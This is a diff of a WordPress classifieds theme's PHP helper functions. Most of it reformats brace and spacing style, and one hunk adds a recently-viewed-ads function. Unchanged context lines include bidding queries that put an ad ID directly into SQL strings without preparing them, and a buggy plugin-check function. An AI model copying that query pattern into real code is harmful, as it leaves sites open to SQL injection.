@@ -2,18 +2,21 @@
 /* static string and localization */
 add_action('wp_enqueue_scripts', 'adforest_static_strings', 100);
 
-function adforest_static_strings() {
+function adforest_static_strings()
+{
     $string_array = apply_filters('adforest_get_static_string', '');
     wp_localize_script(
-            'adforest-custom', // name of js file
-            'get_strings', $string_array
+        'adforest-custom', // name of js file
+        'get_strings',
+        $string_array
     );
 }
 
 /* make descsription link in theme options */
 if (!function_exists('adforest_make_link')) {
 
-    function adforest_make_link($url, $text) {
+    function adforest_make_link($url, $text)
+    {
         return wp_kses("<a href='" . esc_url($url) . "' target='_blank'>", adforest_required_tags()) . $text . wp_kses('</a>', adforest_required_tags());
     }
 
@@ -21,12 +24,13 @@ if (!function_exists('adforest_make_link')) {
 /* Required tag */
 if (!function_exists('adforest_required_tags')) {
 
-    function adforest_required_tags() {
+    function adforest_required_tags()
+    {
         return $allowed_tags = array(
             'div' => adforest_required_attributes(),
             'span' => adforest_required_attributes(),
             'p' => adforest_required_attributes(),
-            'a' => array_merge(adforest_required_attributes(), array('href' => array(), 'rel' => array(), 'target' => array('_blank', '_top'),)),
+            'a' => array_merge(adforest_required_attributes(), array('href' => array(), 'rel' => array(), 'target' => array('_blank', '_top'), )),
             'u' => adforest_required_attributes(),
             'br' => adforest_required_attributes(),
             'i' => adforest_required_attributes(),
@@ -53,7 +57,8 @@ if (!function_exists('adforest_required_tags')) {
 /* Required attributes */
 if (!function_exists('adforest_required_attributes')) {
 
-    function adforest_required_attributes() {
+    function adforest_required_attributes()
+    {
         return $default_attribs = array(
             'id' => array(),
             'src' => array(),
@@ -87,7 +92,8 @@ if (!function_exists('adforest_required_attributes')) {
 }
 if (!function_exists('adforest_get_all_countries')) {
 
-    function adforest_get_all_countries() {
+    function adforest_get_all_countries()
+    {
         $res = array();
         if (!is_admin()) {
             return $res;
@@ -102,7 +108,7 @@ if (!function_exists('adforest_get_all_countries')) {
         $countries = get_posts($args);
         foreach ($countries as $country) {
             $stripped = trim(preg_replace('/\s+/', ' ', $country->post_excerpt));
-            $res[$stripped] = $country->post_title;
+            $res[ $stripped ] = $country->post_title;
         }
         return $res;
     }
@@ -111,7 +117,8 @@ if (!function_exists('adforest_get_all_countries')) {
 /* get all clean strings */
 if (!function_exists('adforest_clean_strings')) {
 
-    function adforest_clean_strings($string = '') {
+    function adforest_clean_strings($string = '')
+    {
         $string = preg_replace('/%u([0-9A-F]+)/', '&#x$1;', $string);
         return html_entity_decode($string, ENT_COMPAT, 'UTF-8');
     }
@@ -120,14 +127,16 @@ if (!function_exists('adforest_clean_strings')) {
 /* avoid echo $ */
 if (!function_exists('adforest_returnEcho')) {
 
-    function adforest_returnEcho($html = '') {
+    function adforest_returnEcho($html = '')
+    {
         return $html;
     }
 
 }
 if (!function_exists('adforest_clean_shortcode')) {
 
-    function adforest_clean_shortcode($string) {
+    function adforest_clean_shortcode($string)
+    {
         $replace = str_replace("`{`", "[", $string);
         $replace = str_replace("`}`", "]", $replace);
         $replace = str_replace("``", '"', $replace);
@@ -138,7 +147,8 @@ if (!function_exists('adforest_clean_shortcode')) {
 /* getting social icon array */
 if (!function_exists('adforest_social_icons')) {
 
-    function adforest_social_icons($social_network) {
+    function adforest_social_icons($social_network)
+    {
         $social_icons = array(
             'Facebook' => 'fa fa-facebook',
             'Twitter' => 'fa fa-twitter ',
@@ -157,7 +167,7 @@ if (!function_exists('adforest_social_icons')) {
             'behance' => 'fa fa-behance',
             'DeviantART' => 'fa fa-deviantart',
         );
-        return $social_icons[$social_network];
+        return $social_icons[ $social_network ];
     }
 
 }
@@ -167,7 +177,8 @@ add_action('wp_ajax_nopriv_product_suggestions', 'adforest_product_suggestions_l
 add_action('wp_ajax_product_suggestions', 'adforest_product_suggestions_live_search');
 if (!function_exists('adforest_product_suggestions_live_search')) {
 
-    function adforest_product_suggestions_live_search() {
+    function adforest_product_suggestions_live_search()
+    {
         $return = array();
         $args = array(
             's' => isset($_GET['query']) && !empty($_GET['query']) ? $_GET['query'] : '',
@@ -177,8 +188,9 @@ if (!function_exists('adforest_product_suggestions_live_search')) {
         );
         $args = apply_filters('adforest_wpml_show_all_posts', $args);
         $search_results = new WP_Query($args);
-        if ($search_results->have_posts()) :
-            while ($search_results->have_posts()) : $search_results->the_post();
+        if ($search_results->have_posts()):
+            while ($search_results->have_posts()):
+                $search_results->the_post();
                 // shorten the title a little
                 $title = $search_results->post->post_title;
                 $return[] = adforest_clean_strings($title);
@@ -200,7 +212,8 @@ if (!function_exists('adforest_product_suggestions_live_search')) {
 /* ------------------------------------------------ */
 if (!function_exists('adforest_pagination')) {
 
-    function adforest_pagination($w_query = array()) {
+    function adforest_pagination($w_query = array())
+    {
         if (is_singular())
             return;
 
@@ -225,7 +238,7 @@ if (!function_exists('adforest_pagination')) {
             $links[] = $paged - 2;
         }
 
-        if (( $paged + 2 ) <= $max) {
+        if (($paged + 2) <= $max) {
             $links[] = $paged + 2;
             $links[] = $paged + 1;
         }
@@ -272,7 +285,8 @@ if (!function_exists('adforest_pagination')) {
 // Last login time
 if (!function_exists('adforest_get_last_login')) {
 
-    function adforest_get_last_login($uid) {
+    function adforest_get_last_login($uid)
+    {
         $from = get_user_meta($uid, '_sb_last_login', true);
         if ($from == "") {
             update_user_meta($uid, '_sb_last_login', time());
@@ -285,7 +299,8 @@ if (!function_exists('adforest_get_last_login')) {
 
 if (!function_exists('adforest_human_time_diff')) {
 
-    function adforest_human_time_diff($from, $to = '') {
+    function adforest_human_time_diff($from, $to = '')
+    {
 
         adforest_set_date_timezone();
         if (empty($to)) {
@@ -346,7 +361,8 @@ if (!function_exists('adforest_human_time_diff')) {
 
 if (!function_exists('adforest_set_date_timezone')) {
 
-    function adforest_set_date_timezone() {
+    function adforest_set_date_timezone()
+    {
         global $adforest_theme;
         $time_zones_val = isset($adforest_theme['bid_timezone']) && $adforest_theme['bid_timezone'] != '' ? $adforest_theme['bid_timezone'] : 'Etc/UTC';
         if (function_exists('adforest_timezone_list') && isset($adforest_theme['bid_timezone']) && $adforest_theme['bid_timezone'] != '') {
@@ -365,7 +381,8 @@ if (!function_exists('adforest_set_date_timezone')) {
 /* check is plugin active */
 if (function_exists('adforest_is_plugin_active')) {
 
-    function adforest_is_plugin_active() {
+    function adforest_is_plugin_active()
+    {
         if (in_array($plugin_name, apply_filters('active_plugins', get_option('active_plugins')))) {
             return true;
         } else {
@@ -377,7 +394,8 @@ if (function_exists('adforest_is_plugin_active')) {
 /* authentication check */
 if (!function_exists('adforest_authenticate_check')) {
 
-    function adforest_authenticate_check() {
+    function adforest_authenticate_check()
+    {
         if (get_current_user_id() == "" || get_current_user_id() == 0) {
             echo '0|' . __("You are not logged in.", 'adforest');
             die();
@@ -388,13 +406,14 @@ if (!function_exists('adforest_authenticate_check')) {
 // check page build with elementor /
 if (!function_exists('sb_is_elementor')) {
 
-    function sb_is_elementor($page_id) {
+    function sb_is_elementor($page_id)
+    {
         if (class_exists('Elementor\Plugin')) {
-          // return \Elementor\Plugin::$instance->db->is_built_with_elementor($page_id);
+            // return \Elementor\Plugin::$instance->db->is_built_with_elementor($page_id);
 
-             return \Elementor\Plugin::$instance->documents->get( $page_id )->is_built_with_elementor($page_id);
+            return \Elementor\Plugin::$instance->documents->get($page_id)->is_built_with_elementor($page_id);
 
-            
+
         } else {
             return false;
         }
@@ -404,7 +423,8 @@ if (!function_exists('sb_is_elementor')) {
 // Get user profile PIC
 if (!function_exists('adforest_get_user_dp')) {
 
-    function adforest_get_user_dp($user_id, $size = 'adforest-single-small') {
+    function adforest_get_user_dp($user_id, $size = 'adforest-single-small')
+    {
         global $adforest_theme;
         $user_pic = trailingslashit(get_template_directory_uri()) . 'images/9.jpg';
         if (isset($adforest_theme['sb_user_dp']['url']) && $adforest_theme['sb_user_dp']['url'] != "") {
@@ -442,7 +462,8 @@ if (!function_exists('adforest_get_user_dp')) {
 /* set url params */
 if (!function_exists('adforest_set_url_param')) {
 
-    function adforest_set_url_param($adforest_url = '', $key = '', $value = '') {
+    function adforest_set_url_param($adforest_url = '', $key = '', $value = '')
+    {
         if ($adforest_url != '') {
             $adforest_url = add_query_arg(array($key => $value), $adforest_url);
             $adforest_url = apply_filters('adforest_page_lang_url', $adforest_url);
@@ -452,9 +473,44 @@ if (!function_exists('adforest_set_url_param')) {
 
 }
 
+// Recently Viewed posts//
+if (!function_exists('display_recently_viewed_ad_posts')) {
+    function display_recently_viewed_ad_posts() {
+        if (is_user_logged_in()) {
+            $user_id = get_current_user_id();
+            $recently_viewed = get_user_meta($user_id, 'recently_viewed_ad_posts', true);
+    
+            if ($recently_viewed && is_array($recently_viewed)) {
+                $recently_viewed = array_filter($recently_viewed); // Remove any empty values
+                $paged = get_query_var('paged', 1);
+    
+                $args = array(
+                    'post_type' => 'ad_post',
+                    'post_status' => 'publish',
+                    'posts_per_page' => 3,
+                    'paged' => $paged,
+                    'orderby' => 'date',
+                    'post__in' => $recently_viewed
+                );
+    
+                $fav_ads = 'no';
+                $is_feature = false;
+    
+                // Call the function to get the ads list
+                $output = adforest_pro_get_ads_list($args, $fav_ads);
+    
+                return $output;
+            }
+        }
+        return '<p>No recently viewed ad posts.</p>';
+    }
+}
+// Recently Viewed posts//
+
 if (!function_exists('adforest_cats')) {
 
-    function adforest_cats($taxonomy = 'ad_cats', $all = 'yes') {
+    function adforest_cats($taxonomy = 'ad_cats', $all = 'yes')
+    {
         global $sitepress, $adforest_theme;
         if (!is_admin()) {
             //  return array();
@@ -489,7 +545,7 @@ if (!function_exists('adforest_cats')) {
         if (is_array($ad_cats) && count($ad_cats) > 0) {
             foreach ($ad_cats as $cat) {
                 $count = ($cat->count);
-                $cats[wp_specialchars_decode($cat->name) . ' (' . urldecode_deep($cat->slug) . ')' . ' (' . $count . ')'] = $cat->term_id;
+                $cats[ wp_specialchars_decode($cat->name) . ' (' . urldecode_deep($cat->slug) . ')' . ' (' . $count . ')' ] = $cat->term_id;
             }
         }
         //}
@@ -499,7 +555,8 @@ if (!function_exists('adforest_cats')) {
 }
 if (!function_exists('adforest_load_search_countries')) {
 
-    function adforest_load_search_countries($action_on_complete = '') {
+    function adforest_load_search_countries($action_on_complete = '')
+    {
         global $adforest_theme;
         $stricts = '';
         if (isset($adforest_theme['sb_location_allowed']) && !$adforest_theme['sb_location_allowed'] && isset($adforest_theme['sb_list_allowed_country'])) {
@@ -521,7 +578,8 @@ add_filter('adforest_tax_hierarchy', 'adforest_tax_hierarchy_callback', 10, 2);
 
 if (!function_exists('adforest_tax_hierarchy_callback')) {
 
-    function adforest_tax_hierarchy_callback($html, $tax_args = array()) {
+    function adforest_tax_hierarchy_callback($html, $tax_args = array())
+    {
         /*
          * 'taxonomy'=> 'ad_cats' // add the taxonomy slug
          * 'type' => 'html',  // can be html/array type
@@ -559,7 +617,7 @@ if (!function_exists('adforest_tax_hierarchy_callback')) {
                 } else {
                     if ($vc) {
                         $count = ($term->count);
-                        $html[$depth_sign . wp_specialchars_decode($term->name) . ' (' . urldecode_deep($term->slug) . ')' . ' (' . $count . ')'] = $term->term_id;
+                        $html[ $depth_sign . wp_specialchars_decode($term->name) . ' (' . urldecode_deep($term->slug) . ')' . ' (' . $count . ')' ] = $term->term_id;
                     } else {
                         $html[] = array($term->term_id, wp_specialchars_decode($depth_sign . $term->name));
                     }
@@ -584,7 +642,8 @@ if (!function_exists('adforest_tax_hierarchy_callback')) {
 /* Select map type */
 if (!function_exists('adforest_mapType')) {
 
-    function adforest_mapType() {
+    function adforest_mapType()
+    {
         global $adforest_theme;
         $mapType = 'google_map';
         if (isset($adforest_theme['map-setings-map-type']) && $adforest_theme['map-setings-map-type'] != '') {
@@ -596,7 +655,8 @@ if (!function_exists('adforest_mapType')) {
 }
 
 if (!function_exists('adforest_display_cats')) {
-    function adforest_display_cats($pid, $class = "") {
+    function adforest_display_cats($pid, $class = "")
+    {
         global $adforest_theme;
         $post_categories = wp_get_object_terms($pid, array('ad_cats'), array('orderby' => 'parent'));
         $cats_html = '';
@@ -610,18 +670,20 @@ if (!function_exists('adforest_display_cats')) {
     }
 }
 if (!function_exists('adforest_get_ad_images')) {
-    function adforest_get_ad_images($pid) {
+    function adforest_get_ad_images($pid)
+    {
         global $adforest_theme;
         $re_order = get_post_meta($pid, '_sb_photo_arrangement_', true);
         if ($re_order != "") {
             return explode(',', $re_order);
         } else {
-        return    $attach_media =  get_attached_media('', $pid);
+            return $attach_media = get_attached_media('', $pid);
         }
     }
 }
 if (!function_exists('adforest_get_ad_default_image_url')) {
-    function adforest_get_ad_default_image_url($ad_img_size = '') {
+    function adforest_get_ad_default_image_url($ad_img_size = '')
+    {
         global $adforest_theme;
         $image_url = $adforest_theme['default_related_image']['url'];
         if (isset($adforest_theme['default_related_image']['id']) && !empty($adforest_theme['default_related_image']['id'])) {
@@ -634,7 +696,8 @@ if (!function_exists('adforest_get_ad_default_image_url')) {
 }
 
 if (!function_exists('adforest_video_icon')) {
-    function adforest_video_icon($is_grid2 = false, $class = 'play-video', $icon_class = 'fa fa-play-circle-o') {
+    function adforest_video_icon($is_grid2 = false, $class = 'play-video', $icon_class = 'fa fa-play-circle-o')
+    {
         global $adforest_theme;
         $fet_cls = '';
         if ($is_grid2 && get_post_meta(get_the_ID(), '_adforest_is_feature', true) == '1') {
@@ -648,7 +711,8 @@ if (!function_exists('adforest_video_icon')) {
 }
 if (!function_exists('adforest_adPrice')) {
 
-    function adforest_adPrice($id = '', $class = 'negotiable', $tag = 'h3') {
+    function adforest_adPrice($id = '', $class = 'negotiable', $tag = 'h3')
+    {
         if (get_post_meta($id, '_adforest_ad_price', true) == "" && get_post_meta($id, '_adforest_ad_price_type', true) == "on_call") {
             return __("Price On Call", 'adforest');
         }
@@ -662,7 +726,7 @@ if (!function_exists('adforest_adPrice')) {
 
         $price = 0;
         global $adforest_theme;
-        $thousands_sep =isset($adforest_theme['sb_price_separator_remove']) &&  $adforest_theme['sb_price_separator_remove'] == '1' ? "" : ",";
+        $thousands_sep = isset($adforest_theme['sb_price_separator_remove']) && $adforest_theme['sb_price_separator_remove'] == '1' ? "" : ",";
 
         if (isset($adforest_theme['sb_price_separator']) && $adforest_theme['sb_price_separator'] != "" && $adforest_theme['sb_price_separator_remove'] != '1') {
             $thousands_sep = $adforest_theme['sb_price_separator'];
@@ -685,7 +749,7 @@ if (!function_exists('adforest_adPrice')) {
                 $price = number_format(get_post_meta($id, '_adforest_ad_price', true), $decimals, $decimals_separator, $thousands_sep);
             }
 
-            $price = ( isset($price) && $price != "") ? $price : 0;
+            $price = (isset($price) && $price != "") ? $price : 0;
 
             if (isset($adforest_theme['sb_price_direction']) && $adforest_theme['sb_price_direction'] == 'right') {
                 $price = $price . $curreny;
@@ -731,7 +795,8 @@ if (!function_exists('adforest_adPrice')) {
 /* get post description as per need. */
 if (!function_exists('adforest_words_count')) {
 
-    function adforest_words_count($contect = '', $limit = 180) {
+    function adforest_words_count($contect = '', $limit = 180)
+    {
         $string = '';
         $contents = strip_tags(strip_shortcodes($contect));
         $contents = adforest_removeURL($contents);
@@ -749,7 +814,8 @@ if (!function_exists('adforest_words_count')) {
 /* Allow Pending products to be viewed by listing/product owner */
 if (!function_exists('posts_for_current_author')) {
 
-    function posts_for_current_author($query) {
+    function posts_for_current_author($query)
+    {
         if (isset($_GET['post_type']) && $_GET['post_type'] == "ad_post" && isset($_GET['p'])) {
             $post_id = $_GET['p'];
             $post_author = get_post_field('post_author', $post_id);
@@ -770,7 +836,8 @@ add_filter('pre_get_posts', 'posts_for_current_author');
 /* remove url from excerpt */
 if (!function_exists('adforest_removeURL')) {
 
-    function adforest_removeURL($string) {
+    function adforest_removeURL($string)
+    {
         return preg_replace("/\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|$!:,.;]*[A-Z0-9+&@#\/%=~_|$]/i", '', $string);
     }
 
@@ -779,7 +846,8 @@ if (!function_exists('adforest_removeURL')) {
 /* Get and Set Post Views */
 if (!function_exists('adforest_getPostViews')) {
 
-    function adforest_getPostViews($postID) {
+    function adforest_getPostViews($postID)
+    {
         $postID = esc_html($postID);
         $count_key = 'sb_post_views_count';
         $count = get_post_meta($postID, $count_key, true);
@@ -796,7 +864,8 @@ if (!function_exists('adforest_getPostViews')) {
 
 if (!function_exists('adforest_ad_locations_limit')) {
 
-    function adforest_ad_locations_limit($ad_location = '') {
+    function adforest_ad_locations_limit($ad_location = '')
+    {
         global $adforest_theme;
         if (isset($adforest_theme['sb_ad_location_limit_on']) && $adforest_theme['sb_ad_location_limit_on'] && isset($adforest_theme['sb_ad_location_limit']) && $adforest_theme['sb_ad_location_limit'] != "") {
             return adforest_words_count($ad_location, $adforest_theme['sb_ad_location_limit']);
@@ -809,12 +878,14 @@ if (!function_exists('adforest_ad_locations_limit')) {
 
 if (!trait_exists('adforest_reuse_functions')) {
 
-    trait adforest_reuse_functions {
+    trait adforest_reuse_functions
+    {
 
-        function adforect_widget_open($instance) {
+        function adforect_widget_open($instance)
+        {
 
             global $adforest_theme;
-            if (isset($adforest_theme['search_design']) && $adforest_theme['search_design'] == 'sidebar'  || $adforest_theme['search_design'] == "map") {
+            if (isset($adforest_theme['search_design']) && $adforest_theme['search_design'] == 'sidebar' || $adforest_theme['search_design'] == "map") {
                 $open_widget = 0;
                 if (isset($instance['open_widget'])) {
                     $open_widget = $instance['open_widget'];
@@ -836,7 +907,8 @@ if (!trait_exists('adforest_reuse_functions')) {
 }
 if (!function_exists('adforest_cat_link_page')) {
 
-    function adforest_cat_link_page($category_id, $type = '', $tax = 'cat_id') {
+    function adforest_cat_link_page($category_id, $type = '', $tax = 'cat_id')
+    {
         global $adforest_theme;
 
         $sb_search_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_search_page']);
@@ -851,11 +923,12 @@ if (!function_exists('adforest_cat_link_page')) {
 }
 if (!function_exists('adforest_login_with_redirect_url_param')) {
 
-    function adforest_login_with_redirect_url_param($redirect_url = '') {
+    function adforest_login_with_redirect_url_param($redirect_url = '')
+    {
         global $adforest_theme;
         $final_redi_url = '';
         $red_url = '';
-         $sb_sign_in_page   =    isset($adforest_theme['sb_sign_in_page']) ? apply_filters('adforest_language_page_id', $adforest_theme['sb_sign_in_page']) : "#";
+        $sb_sign_in_page = isset($adforest_theme['sb_sign_in_page']) ? apply_filters('adforest_language_page_id', $adforest_theme['sb_sign_in_page']) : "#";
         $login_page_url = isset($adforest_theme['sb_sign_in_page']) && !empty($adforest_theme['sb_sign_in_page']) ? get_the_permalink($sb_sign_in_page) : home_url('/');
         if ($redirect_url != '') {
             $query_url = parse_url($login_page_url, PHP_URL_QUERY);
@@ -873,7 +946,8 @@ if (!function_exists('adforest_login_with_redirect_url_param')) {
 }
 if (!function_exists('adforest_setPostViews')) {
 
-    function adforest_setPostViews($postID) {
+    function adforest_setPostViews($postID)
+    {
         $postID = esc_html($postID);
         $count_key = 'sb_post_views_count';
         $count = get_post_meta($postID, $count_key, true);
@@ -890,9 +964,10 @@ if (!function_exists('adforest_setPostViews')) {
 }
 if (!function_exists('adforest_get_ad_cats')) {
 
-    function adforest_get_ad_cats($id, $by = 'name', $for_country = false, $event_tax = "") {
+    function adforest_get_ad_cats($id, $by = 'name', $for_country = false, $event_tax = "")
+    {
         $taxonomy = 'ad_cats'; //Put your custom taxonomy term here
-      
+
         if ($for_country) {
             $taxonomy = 'ad_country';
         } else {
@@ -914,7 +989,7 @@ if (!function_exists('adforest_get_ad_cats')) {
                 break;
             }
         }
-        $child_term_id= "";
+        $child_term_id = "";
         if ($myparentID != "") {
             $mychildID = '';
             // Right, the parent is set, now let's get the children
@@ -938,12 +1013,12 @@ if (!function_exists('adforest_get_ad_cats')) {
                     }
                 }
                 if ($mychildchildID != "") {
-                    $child_term_id= "";
+                    $child_term_id = "";
                     // Right, the parent is set, now let's get the children
                     foreach ($terms as $term) {
                         if ($term->parent == $mychildchildID) { // this ignores the parent of the current post taxonomy
                             $child_term = $term; // this gets the children of the current post taxonomy	 
-                            $child_term_id = $child_term->term_id; 
+                            $child_term_id = $child_term->term_id;
                             $cats[] = array('name' => $child_term->name, 'id' => $child_term->term_id);
                             break;
                         }
@@ -963,7 +1038,7 @@ if (!function_exists('adforest_get_ad_cats')) {
         }
         return $cats;
 
-//
+        //
 //        $post_categories = wp_get_object_terms($id, array('ad_cats'), array('orderby' => 'term_group'));
 //        $cats = array();
 //        foreach ($post_categories as $c) {
@@ -978,7 +1053,8 @@ if (!function_exists('adforest_get_ad_cats')) {
 /* Time difference n days */
 if (!function_exists('adforest_days_diff')) {
 
-    function adforest_days_diff($now, $from) {
+    function adforest_days_diff($now, $from)
+    {
         $datediff = $now - $from;
         return floor($datediff / (60 * 60 * 24));
     }
@@ -987,7 +1063,8 @@ if (!function_exists('adforest_days_diff')) {
 
 if (!function_exists('adforest_owner_text_callback')) {
 
-    function adforest_owner_text_callback($phone_number = '') {
+    function adforest_owner_text_callback($phone_number = '')
+    {
         global $adforest_theme;
         $owner_deal_text = isset($adforest_theme['owner_deal_text']) && !empty($adforest_theme['owner_deal_text']) ? $adforest_theme['owner_deal_text'] : '';
 
@@ -1000,7 +1077,8 @@ if (!function_exists('adforest_owner_text_callback')) {
 }
 if (!function_exists('adforest_bidding_stats')) {
 
-    function adforest_bidding_stats($ad_id, $style = 'style-1') {
+    function adforest_bidding_stats($ad_id, $style = 'style-1')
+    {
         global $adforest_theme;
         $html = '';
         $bids_res = adforest_get_all_biddings_array($ad_id);
@@ -1301,7 +1379,8 @@ if (!function_exists('adforest_bidding_stats')) {
 }
 if (!function_exists('adforest_get_all_biddings_array')) {
 
-    function adforest_get_all_biddings_array($ad_id) {
+    function adforest_get_all_biddings_array($ad_id)
+    {
         global $wpdb;
         $biddings = $wpdb->get_results("SELECT meta_value FROM $wpdb->postmeta WHERE post_id = '$ad_id' AND  meta_key like  '_adforest_bid_%' ORDER BY meta_id DESC", OBJECT);
         $bid_array = array();
@@ -1309,7 +1388,7 @@ if (!function_exists('adforest_get_all_biddings_array')) {
             foreach ($biddings as $bid) {
                 // date - comment - user - offer
                 $data_array = explode('_separator_', $bid->meta_value);
-                $bid_array[$data_array[2] . '_' . $data_array[0]] = $data_array[3];
+                $bid_array[ $data_array[2] . '_' . $data_array[0] ] = $data_array[3];
             }
         }
 
@@ -1319,38 +1398,48 @@ if (!function_exists('adforest_get_all_biddings_array')) {
 }
 if (!function_exists('adforest_html_bidding_system')) {
 
-    function adforest_html_bidding_system($pid, $bid_style = 'style-1') {
+    function adforest_html_bidding_system($pid, $bid_style = 'style-1')
+    {
         global $adforest_theme;
         $pid = apply_filters('adforest_language_page_id', $pid, 'ad_post');
-        ?><div class="all-bids-comment" id="all-bids-comment">
+        ?>
+        <div class="all-bids-comment" id="all-bids-comment">
             <h3> <?php echo esc_html($adforest_theme['sb_comments_section_title']); ?></h3>
 
-            <?php echo adforest_bidding_html($pid); ?>             
+            <?php echo adforest_bidding_html($pid); ?>
 
-            <div class="bidiing-comment">             
+            <div class="bidiing-comment">
                 <?php
                 $bid_end_date = get_post_meta($pid, '_adforest_ad_bidding_date', true); // '2018-03-16 14:59:00';
                 if ($bid_end_date != "" && date('Y-m-d H:i:s') > $bid_end_date && isset($adforest_theme['bidding_timer']) && $adforest_theme['bidding_timer']) {
                     echo '<em>' . __('Bidding has been closed.', 'adforest') . '</em>';
                 } else {
                     ?>
-                    <form role="form" id="sb_bid_ad" >
+                    <form role="form" id="sb_bid_ad">
                         <div class="row">
 
                             <?php
                             $col = 8;
                             ?>
                             <div class="col-lg-2 col-md-2 col-sm-12">
-                                <input name="bid_amount" placeholder="<?php echo __('Bid', 'adforest'); ?>" class="form-control" type="text" data-parsley-required="true" data-parsley-pattern="/^[0-9]+\.?[0-9]*$/" data-parsley-error-message="<?php echo __('only numbers allowed.', 'adforest'); ?>" autocomplete="off" maxlength="12"/>
+                                <input name="bid_amount" placeholder="<?php echo __('Bid', 'adforest'); ?>" class="form-control"
+                                    type="text" data-parsley-required="true" data-parsley-pattern="/^[0-9]+\.?[0-9]*$/"
+                                    data-parsley-error-message="<?php echo __('only numbers allowed.', 'adforest'); ?>"
+                                    autocomplete="off" maxlength="12" />
                             </div>
-                            <div class="col-md-<?php echo esc_attr($col); ?> margin-bottom-10">   
-                                <input name="bid_comment" data-parsley-required="true" data-parsley-error-message="<?php echo __('This field is required.', 'adforest'); ?>" placeholder="<?php echo __('Comments...', 'adforest'); ?>" class="form-control" type="text" autocomplete="off">
+                            <div class="col-md-<?php echo esc_attr($col); ?> margin-bottom-10">
+                                <input name="bid_comment" data-parsley-required="true"
+                                    data-parsley-error-message="<?php echo __('This field is required.', 'adforest'); ?>"
+                                    placeholder="<?php echo __('Comments...', 'adforest'); ?>" class="form-control" type="text"
+                                    autocomplete="off">
                                 <small><em><?php echo esc_html($adforest_theme['sb_comments_section_note']); ?></em></small>
-                            </div>   
+                            </div>
                             <div class="col-md-2">
-                                <button class="btn btn-theme bid_submit" type="submit"><?php echo __('Send', 'adforest'); ?></button>
+                                <button class="btn btn-theme bid_submit"
+                                    type="submit"><?php echo __('Send', 'adforest'); ?></button>
                                 <input type="hidden" name="ad_id" value="<?php echo esc_attr($pid) ?>" />
-                                <input type="hidden" id="sb-bidding-token" value="<?php echo wp_create_nonce('sb_bidding_secure'); ?>" />
+                                <input type="hidden" id="sb-bidding-token"
+                                    value="<?php echo wp_create_nonce('sb_bidding_secure'); ?>" />
                             </div>
                         </div>
                     </form>
@@ -1366,7 +1455,8 @@ if (!function_exists('adforest_html_bidding_system')) {
 }
 if (!function_exists('adforest_bidding_html')) {
 
-    function adforest_bidding_html($ad_id, $bidhtml_style = 'style-1') {
+    function adforest_bidding_html($ad_id, $bidhtml_style = 'style-1')
+    {
         global $adforest_theme;
 
         $curreny = $adforest_theme['sb_currency'];
@@ -1415,7 +1505,7 @@ if (!function_exists('adforest_bidding_html')) {
                 }
                 // Price format
                 $price = number_format($offer, $decimals, $decimals_separator, $thousands_sep);
-                $price = ( isset($price) && $price != "") ? $price : 0;
+                $price = (isset($price) && $price != "") ? $price : 0;
 
                 if (isset($adforest_theme['sb_price_direction']) && $adforest_theme['sb_price_direction'] == 'right') {
                     $price = $price . $curreny;
@@ -1460,7 +1550,8 @@ if (!function_exists('adforest_bidding_html')) {
 
 if (!function_exists('adforest_get_all_biddings')) {
 
-    function adforest_get_all_biddings($ad_id) {
+    function adforest_get_all_biddings($ad_id)
+    {
         global $wpdb;
         $biddings = $wpdb->get_results("SELECT * FROM $wpdb->postmeta WHERE post_id = '$ad_id' AND  meta_key like  '_adforest_bid_%' ORDER BY meta_id DESC", OBJECT);
         return $biddings;
@@ -1469,7 +1560,8 @@ if (!function_exists('adforest_get_all_biddings')) {
 }
 if (!function_exists('adforest_fetch_reviews_average')) {
 
-    function adforest_fetch_reviews_average($listing_id) {
+    function adforest_fetch_reviews_average($listing_id)
+    {
         $comments = '';
         $get_rating_avrage = '';
         $one_star = '';
@@ -1526,8 +1618,8 @@ if (!function_exists('adforest_fetch_reviews_average')) {
             $total_stars = explode(".", $get_rating_avrage1);
 
             $stars_html = '';
-            $first_part = (isset($total_stars[0]) && $total_stars[0] > 0 && $total_stars[0] != "" ) ? $total_stars[0] : 0;
-            $second_part = (isset($total_stars[1]) && $total_stars[1] > 0 && $total_stars[1] != "" ) ? $total_stars[1] : 0;
+            $first_part = (isset($total_stars[0]) && $total_stars[0] > 0 && $total_stars[0] != "") ? $total_stars[0] : 0;
+            $second_part = (isset($total_stars[1]) && $total_stars[1] > 0 && $total_stars[1] != "") ? $total_stars[1] : 0;
             for ($stars = 1; $stars <= 5; $stars++) {
                 if ($stars <= $first_part && $first_part > 0) {
                     $stars_html .= '<i class="fa fa-star color" aria-hidden="true"></i>';
@@ -1558,7 +1650,8 @@ if (!function_exists('adforest_fetch_reviews_average')) {
 
 if (!function_exists('adforest_comments_pagination2')) {
 
-    function adforest_comments_pagination2($total_records, $current_page) {
+    function adforest_comments_pagination2($total_records, $current_page)
+    {
         // Check if a records is set.
         if (!isset($total_records))
             return;
@@ -1575,7 +1668,8 @@ if (!function_exists('adforest_comments_pagination2')) {
             'prev_next' => true,
             'prev_text' => '<i class="fa fa-chevron-left" aria-hidden="true"></i>',
             'next_text' => '<i class="fa fa-chevron-right" aria-hidden="true"></i>',
-            'type' => 'array');
+            'type' => 'array'
+        );
         $pagination = paginate_links($args);
         $pagination_html = '';
         if (count((array) $pagination) > 0) {
@@ -1598,7 +1692,8 @@ if (!function_exists('adforest_comments_pagination2')) {
 
 if (!function_exists('adforest_comments_pagination')) {
 
-    function adforest_comments_pagination($total_records, $current_page) {
+    function adforest_comments_pagination($total_records, $current_page)
+    {
         // Check if a records is set.
         if (!isset($total_records))
             return;
@@ -1615,7 +1710,8 @@ if (!function_exists('adforest_comments_pagination')) {
             'prev_next' => true,
             'prev_text' => '<i class="fa fa-chevron-left" aria-hidden="true"></i>',
             'next_text' => '<i class="fa fa-chevron-right" aria-hidden="true"></i>',
-            'type' => 'array');
+            'type' => 'array'
+        );
         $pagination = paginate_links($args);
         $pagination_html = '';
         if (count((array) $pagination) > 0) {
@@ -1638,7 +1734,8 @@ if (!function_exists('adforest_comments_pagination')) {
 
 if (!function_exists('adforest_social_share')) {
 
-    function adforest_social_share() {
+    function adforest_social_share()
+    {
         // check if plugin addtoany actiavted then load that otherwise builtin function
         if (in_array('add-to-any/add-to-any.php', apply_filters('active_plugins', get_option('active_plugins')))) {
             return do_shortcode('[addtoany]');
@@ -1667,7 +1764,8 @@ if (!function_exists('adforest_social_share')) {
 /* making number callable */
 if (!function_exists('adforest_get_CallAbleNumber')) {
 
-    function adforest_get_CallAbleNumber($phone_number = '') {
